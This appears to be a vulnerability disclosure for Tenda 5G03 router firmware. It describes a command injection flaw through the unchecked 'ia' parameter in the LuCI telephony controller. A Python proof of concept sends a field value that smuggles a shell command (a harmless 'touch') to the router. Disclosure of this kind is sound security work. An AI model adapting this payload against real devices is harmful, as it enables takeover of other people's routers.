Submittion Date: 2026.3.16  
Vendor: 5G03  
Firmware: V05.03.02.04 (Version 1.0)  
Download Link: https://www.tenda.com.cn/material/show/4058  

In /usr/lib/lua/luci/controller/admin/telephony.lua, the function ```action_radio_on_with_ia_apn``` handles the important parameter string ```ia``` without checking it, 
which leads to a command injection vulnerability. 

![image](../image/action_radio_on_with_ia_apn-1.png)
![image](../image/action_radio_on_with_ia_apn-2.png)

The potentially attacking vector is as follows:  
```py
import requests

TARGET_URL = "http://192.168.1.1/cgi-bin/luci/admin/telephony/trigger_set_radio_on_with_ia"
COOKIES = {"sysauth": "session_id"}

cmd = 'any_ia"; touch /tmp/RADIO_IA_VULN_PROVED; #'

data = {
    "ia_apn": "1",
    "ia": cmd
}

try:
    response = requests.post(TARGET_URL, data=data, cookies=COOKIES, timeout=10)
    if response.status_code == 200:
        print("[+] Attack successfully")
    else:
        print(f"[-] Attack failed")
except Exception as e:
    print(f"[-] Error: {e}")
```

